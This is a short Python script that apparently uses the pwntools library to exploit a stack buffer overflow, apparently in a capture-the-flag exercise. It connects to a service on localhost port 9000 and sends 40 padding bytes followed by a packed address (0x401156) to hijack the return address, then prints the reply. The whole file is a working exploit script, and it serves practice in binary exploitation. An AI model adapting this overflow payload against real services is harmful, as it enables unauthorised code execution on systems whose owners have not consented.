from pwn import *

#context.log_level = 'debug' # debug mode

p = remote('0.0.0.0', 9000)
payload = (b'A'*40+p64(0x0000000000401156))
p.sendline(payload)
#p.interactive()
response = p.recvall() 
print(response.decode())